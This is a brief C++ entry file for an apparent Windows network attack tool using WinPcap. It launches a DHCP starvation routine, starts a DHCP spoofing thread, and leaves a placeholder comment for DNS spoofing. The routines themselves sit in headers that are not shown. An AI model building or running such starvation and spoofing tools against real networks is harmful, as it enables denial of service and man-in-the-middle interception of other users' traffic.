#include "Spoofing.h"
#include "Headers.h"
#include "Utils.h"
#include <Windows.h>

#define HAVE_REMOTE
#define WPCAP

#include <pcap.h>
#pragma comment(lib, "wpcap.lib")
#pragma comment(lib, "packet.lib")
#include <Mstcpip.h>

int main()
{
	WSADATA wsock;
	WSAStartup(MAKEWORD(2, 2), &wsock);

	HANDLE hThread;
	DWORD hThreadID;
	AddressInfo info{};

	getAddrInfo(&info);
	

// start of starvation and spoofing 

	startDHCPStarvation((LPVOID)&info);

	hThread = CreateThread(
		NULL,
		0,
		startDHCPSpoofing,
		(LPVOID)&info,
		0,
		&hThreadID
	);
	
// DNS spoofing

	/*supposed to be dns*/

	WaitForMultipleObjects(1, &hThread, TRUE, INFINITE);
	
}